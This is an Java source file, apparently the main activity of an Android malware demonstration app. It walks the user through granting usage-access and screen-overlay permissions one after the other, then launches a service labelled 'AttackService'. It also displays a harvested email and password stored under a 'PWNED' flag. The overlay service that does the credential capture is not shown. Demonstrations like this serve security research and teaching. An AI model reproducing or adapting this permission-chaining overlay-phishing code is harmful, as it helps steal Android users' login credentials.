package app.mordred.androidmalwaredemo;

import androidx.appcompat.app.AppCompatActivity;

import android.app.AppOpsManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    private static final int USAGE_STAT_PERMISSION_ACTIVITY = 17;
    private static final int OVERLAY_WINDOW_PERMISSION_ACTIVITY = 1234;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        TextView textView = findViewById(R.id.mainTv);

        SharedPreferences sh = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());

        String ret = "";
        if (!sh.getBoolean("PWNED", false)) {
            ret += "Status: NOT POWNED YET \n";
        } else {
            ret += "Status: POWNED \n";
            ret += "Your mail: " + sh.getString("CRED_MAIL", "") + "\n";
            ret += "Your password: " + sh.getString("CRED_PWD", "") + "\n";
        }
        textView.setText(ret);

        initiatePermissionCheck();
    }

    private void initiatePermissionCheck() {
        if(!hasUsageStatsPermission(this)) {
            requestUsageStatPermission();
        }
    }

    private void requestUsageStatPermission() {
        Intent usageStatPermIntent = new Intent("android.settings.USAGE_ACCESS_SETTINGS");
        startActivityForResult(usageStatPermIntent, USAGE_STAT_PERMISSION_ACTIVITY);
    }

    private void requestOverlayWindowPermission() {
        Intent intent = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION", Uri.parse("package:" + getPackageName()));
        startActivityForResult(intent, OVERLAY_WINDOW_PERMISSION_ACTIVITY);
    }

    private boolean hasUsageStatsPermission(Context context) {
        AppOpsManager appOps = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow("android:get_usage_stats",
                android.os.Process.myUid(), context.getPackageName());
        return mode == AppOpsManager.MODE_ALLOWED;
    }

    private void startService() {
        Intent intent = new Intent(this, AttackService.class);
        startService(intent);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == USAGE_STAT_PERMISSION_ACTIVITY) {
            if (hasUsageStatsPermission(this)) {
                // ok now get second perm which we need
                requestOverlayWindowPermission();
            } else {
                Toast.makeText(
                        getApplicationContext(),
                        "Please enable USAGE_STAT_PERMISSION through Settings",
                        Toast.LENGTH_LONG).show();
            }
        } else if (requestCode == OVERLAY_WINDOW_PERMISSION_ACTIVITY) {
            // all perms are okay initate attack
            startService();
        }
    }
}
